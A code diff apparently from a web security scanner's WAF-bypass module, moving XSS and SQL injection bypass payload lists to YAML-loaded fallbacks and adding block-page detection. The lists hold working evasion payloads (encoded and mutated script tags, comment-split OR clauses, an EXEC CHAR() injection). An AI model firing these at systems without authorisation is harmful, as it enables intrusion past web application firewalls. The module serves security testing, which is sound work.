@@ -16,43 +16,47 @@ Bypass techniques applied:
 """
 from __future__ import annotations
 
+import re
 from typing import List
 from urllib.parse import urlparse, parse_qs
 
 from scanner.core.crawler import CrawlResult
 from scanner.core.scan_result import Finding, Severity
 from scanner.utils.http import inject_url_param, fetch
+from scanner.core.payload_loader import load as _load_payloads
 
 # Re-use waf detect probe
 _WAF_PROBE = "'><script>alert(1)</script>/**/UNION/**/SELECT/**/1--"
 
-# WAF-bypass XSS payloads
-_BYPASS_XSS = [
-    "%253cscript%253ealert(1)%253c/script%253e",              # double URL encode
-    "<ScRiPt>alert(1)</ScRiPt>",                              # case mutation
-    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",         # HTML entities
-    "<script>alert(1)</script>",          # unicode escapes
-    "<scr\x00ipt>alert(1)</scr\x00ipt>",                      # null byte
-    "<img src=x onerror=alert(1)//",                          # alternate tag
-    "<svg/onload=alert(1)>",                                  # SVG
-    "<<SCRIPT>alert(1)//<</SCRIPT>",                          # double-open
-    "<script\t>alert(1)</script>",                            # tab in tag
-    "<script\n>alert(1)</script>",                            # newline in tag
+_XSS_FALLBACK = [
+    "%253cscript%253ealert(1)%253c/script%253e",
+    "<ScRiPt>alert(1)</ScRiPt>",
+    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+    "<script>alert(1)</script>",
+    "<scr\x00ipt>alert(1)</scr\x00ipt>",
+    "<img src=x onerror=alert(1)//",
+    "<svg/onload=alert(1)>",
+    "<<SCRIPT>alert(1)//<</SCRIPT>",
+    "<script\t>alert(1)</script>",
+    "<script\n>alert(1)</script>",
 ]
 
-# WAF-bypass SQLi payloads
-_BYPASS_SQLI = [
-    "'/**/OR/**/1=1--",                   # comment-injected OR
-    "'%09OR%091=1--",                     # tab-separated
-    "'%0AOR%0A1=1--",                     # newline-separated
-    "1'%20OR%20'1'='1",                   # URL-encoded spaces
-    "1'/*!50000OR*/1=1--",                # MySQL version comment
-    "1'+OORR+'1'='1",                     # doubled keyword
-    "1' OR 0x31=0x31--",                  # hex comparison
-    "';EXEC(CHAR(115)+CHAR(101)+CHAR(108)+CHAR(101)+CHAR(99)+CHAR(116)+CHAR(32)+CHAR(49))--",  # EXEC char()
-    "' OR 'unusual'='unusual'--",         # unusual string comparison
-    "' OR 1=1#",                          # MySQL hash comment
+_SQLI_FALLBACK = [
+    "'/**/OR/**/1=1--",
+    "'%09OR%091=1--",
+    "'%0AOR%0A1=1--",
+    "1'%20OR%20'1'='1",
+    "1'/*!50000OR*/1=1--",
+    "1'+OORR+'1'='1",
+    "1' OR 0x31=0x31--",
+    "';EXEC(CHAR(115)+CHAR(101)+CHAR(108)+CHAR(101)+CHAR(99)+CHAR(116)+CHAR(32)+CHAR(49))--",
+    "' OR 'unusual'='unusual'--",
+    "' OR 1=1#",
 ]
+
+# Load from YAML (section-aware); fall back to hardcoded lists
+_BYPASS_XSS  = _load_payloads("waf_bypass", section="xss",  fallback=tuple(_XSS_FALLBACK))
+_BYPASS_SQLI = _load_payloads("waf_bypass", section="sqli", fallback=tuple(_SQLI_FALLBACK))
 
 # Error signatures indicating SQL injection slipped through
 _SQLI_ERRORS = [
@@ -74,8 +78,19 @@ _XSS_MARKERS = [
 ]
 
 
+_WAF_BLOCK_BODY = re.compile(
+    r"(access denied|request blocked|blocked by|firewall|security rule|"
+    r"web application firewall|mod_security|cloudflare ray id|sucuri website firewall)",
+    re.IGNORECASE,
+)
+
+
 def _waf_present(page_url: str, client) -> bool:
-    """Quick probe — returns True if the WAF is blocking the standard probe."""
+    """Return True if a WAF is blocking the standard attack probe.
+
+    Checks both status code (403/406/429/503) and common WAF block-page body patterns,
+    since some WAFs return 200 with a custom block page rather than a 4xx status.
+    """
     parsed = urlparse(page_url)
     if parsed.query:
         probe_url = inject_url_param(page_url, next(iter(parse_qs(parsed.query))), _WAF_PROBE)
@@ -85,7 +100,12 @@ def _waf_present(page_url: str, client) -> bool:
     resp = fetch(client, "get", probe_url)
     if not resp:
         return False
-    return resp.status_code in (403, 406, 429, 503)
+    if resp.status_code in (403, 406, 429, 503):
+        return True
+    # Also detect WAFs that return 200 with a block page body
+    if resp.status_code == 200 and _WAF_BLOCK_BODY.search(resp.text[:4096]):
+        return True
+    return False
 
 
 def test(page: CrawlResult, client) -> List[Finding]:
@@ -103,8 +123,11 @@ def test(page: CrawlResult, client) -> List[Finding]:
             resp = fetch(client, "get", probe_url)
             if not resp:
                 continue
-            body = (getattr(resp, "text", "") or "").lower()
-            if any(m.lower() in body for m in _XSS_MARKERS):
+            body = getattr(resp, "text", "") or ""
+            # Require the marker to appear literally (unencoded) in the HTML body —
+            # JSON-escaped (<script) or entity-encoded (&lt;script) forms are
+            # not executable and would be false positives.
+            if any(m in body for m in _XSS_MARKERS):
                 findings.append(Finding(
                     title="XSS — WAF Bypass Successful",
                     severity=Severity.HIGH,
